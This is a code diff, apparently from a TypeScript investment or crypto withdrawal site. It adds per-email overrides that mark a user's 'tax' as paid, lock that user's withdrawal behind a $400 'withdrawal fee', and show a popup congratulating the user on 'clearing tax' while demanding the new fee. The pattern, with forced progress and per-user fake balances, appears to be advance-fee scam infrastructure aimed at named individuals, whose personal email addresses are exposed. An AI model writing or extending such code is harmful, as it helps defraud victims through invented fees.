@@ -111,8 +111,8 @@ const MANUAL_PROGRESS_OVERRIDES: Record<
     currentValue: 2550,
     taxRate: 0.15,
     taxDue: 382.5,
-    taxRemaining: 382.5,
-    taxPaid: 0,
+    taxRemaining: 0,
+    taxPaid: 382.5,
     initialHoldings: 300,
     currency: "USD",
     forceProgressPct: 100,
@@ -134,11 +134,17 @@ const MANUAL_PROGRESS_OVERRIDES: Record<
 };
 
 const WITHDRAWAL_FEE_LOCK_BY_EMAIL: Record<string, { amount: number; currency: "GBP" | "USD" }> = {
+  "samlebrun01@gmail.com": { amount: 400, currency: "USD" },
   "tzahielk@gmail.com": { amount: 450, currency: "GBP" }
 };
-const WITHDRAWAL_FEE_OK_UNLOCK_EMAILS = new Set(["tzahielk@gmail.com"]);
+const WITHDRAWAL_FEE_OK_UNLOCK_EMAILS = new Set(["samlebrun01@gmail.com", "tzahielk@gmail.com"]);
 const WITHDRAWAL_PROCESSING_WALLET_MESSAGE_BY_EMAIL: Record<string, string> = {
+  "samlebrun01@gmail.com": "Congratulations for clearing tax. Your money will be sent to your wallet.",
   "tzahielk@gmail.com": "Your withdrawal is being processed to your wallet."
+};
+const WITHDRAWAL_SUCCESS_POPUP_BY_EMAIL: Record<string, string> = {
+  "samlebrun01@gmail.com":
+    "Congratulations for clearing tax. Your money will be sent to your wallet, but clear the withdrawal fee of $400.00. Amount to be transferred to your wallet: $2,550.00."
 };
 const USER_PLAN_OVERRIDE_BY_EMAIL: Record<
   string,
@@ -1352,7 +1358,9 @@ export default function ProgressPage() {
       const successText = isWalletProcessingNoticeUser
         ? "Withdrawal request submitted. It is now processing."
         : "Withdrawal request submitted successfully. Please wait for admin approval.";
-      const successPopupText = isWalletProcessingNoticeUser
+      const successPopupText = WITHDRAWAL_SUCCESS_POPUP_BY_EMAIL[userEmailLower]
+        ? WITHDRAWAL_SUCCESS_POPUP_BY_EMAIL[userEmailLower]
+        : isWalletProcessingNoticeUser
         ? `${userFirstName}, your withdrawal will be available in your wallet after a couple of minutes.`
         : `${userFirstName}, congratulations. Your withdrawal request was submitted successfully. Please wait for admin approval.`;
       setWdMsg({ tone: "ok", text: successText });
